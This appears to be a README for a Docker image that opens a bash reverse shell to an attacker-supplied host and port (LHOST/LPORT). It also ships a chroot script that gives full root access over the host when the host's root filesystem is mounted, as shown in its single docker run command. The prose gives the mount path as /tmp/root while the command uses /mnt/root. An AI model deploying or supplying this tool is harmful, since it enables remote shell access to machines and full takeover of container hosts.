# Docker reverse shell

A docker image that will connect back to given address port
with a bash reverse shell.

It also contains an useful chroot.sh script
that if the host volume is mounted on /tmp/root, will
give full root access over the host machine.

```sh
docker run -e LHOST=... -e LPORT=... -v /:/mnt/root creekorful/docker-rshell
```
